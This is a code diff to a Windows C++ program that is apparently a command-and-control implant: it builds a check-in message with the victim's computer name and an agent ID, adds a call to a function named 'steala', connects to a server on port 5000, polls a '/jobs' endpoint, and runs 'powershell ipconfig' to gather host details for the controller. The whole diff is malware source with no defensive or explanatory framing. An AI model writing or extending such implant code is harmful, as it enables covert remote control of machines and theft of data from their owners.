@@ -40,8 +40,9 @@ int wmain()
         std::string sleepTimer = std::to_string(number);
         std::string mName(infoBuf, bufCharCount);
         checkin = checkin + guid + "\", \"sleepTime\": " + sleepTimer + ", \"computerName\": \"" + mName + "\", \"agentId\": \"1337\"}";
-        std::cout << checkin << std::endl;
-        
+        cout << steala() << endl;
+
+
         // if successful, connect to the server
         HTTP *client = new HTTP();
         int port = 5000, tls = 0;
@@ -76,9 +77,8 @@ int wmain()
         while(iamImmortal){
             //Sleep(number);
         }
-
+        //request jobs
         std::cout << client->makeHttpRequest(L"POST", L"/jobs", tls) << std::endl;
-        // implant first checks the Computer Name and IP address. Then sends it to the c2
         std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
         std::ifstream temp_file("C:\\Users\\User\\test.txt");
         std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
